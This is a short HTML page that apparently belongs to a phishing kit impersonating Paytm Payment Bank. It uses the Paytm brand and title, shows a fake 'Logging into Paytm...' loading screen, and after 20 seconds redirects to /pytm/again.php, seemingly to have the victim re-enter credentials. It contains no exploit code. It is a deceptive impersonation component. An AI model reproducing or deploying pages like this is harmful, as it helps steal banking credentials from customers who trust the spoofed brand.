<!DOCTYPE html>
<html lang="ptm">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="20; /pytm/again.php" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Paytm Payment Bank</title>
  <style>
#ptm_logo
{
  width: 40%;
  margin-top: 180px;
  margin-left: 100px;
  text-align: center;
}

</style>
</head>
<body>
<img src="blue_loading.gif" alt="" id="ptm_logo">
<div>
<p><center> Logging into Paytm... </center></p>
</div>
</body>
</html>